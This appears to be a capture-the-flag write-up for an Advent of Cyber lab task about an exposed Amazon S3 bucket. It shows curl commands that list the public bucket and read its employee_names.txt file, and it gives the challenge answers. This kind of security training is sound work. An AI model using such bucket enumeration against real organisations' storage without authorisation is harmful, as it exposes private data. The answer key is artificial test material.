# [Day 14] Unknown Storage

## Instructions

McElferson opens today's news paper and see's the headline

Private information leaked from the best festival company

This shocks her! She calls in her lead security consultant to find out more information about this. How do we not know about our own s3 bucket. 

McSkidy's only starting point is a single bucket name: `advent-bucket-one`

Check out the supporting material [here](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#).

## #1 - What is the name of the file you found?

Connecting to the bucket reveals a file named `employee_names.txt`

~~~
$ curl -s http://advent-bucket-one.s3.amazonaws.com/
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>advent-bucket-one</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>employee_names.txt</Key><LastModified>2019-12-14T15:53:25.000Z</LastModified><ETag>&quot;e8d2d18588378e0ee0b27fa1b125ad58&quot;</ETag><Size>7</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
~~~

## #2 - What is in the file?

The file contains the string `mcchef`:

~~~
$ curl -s http://advent-bucket-one.s3.amazonaws.com/employee_names.txt
mcchef
~~~
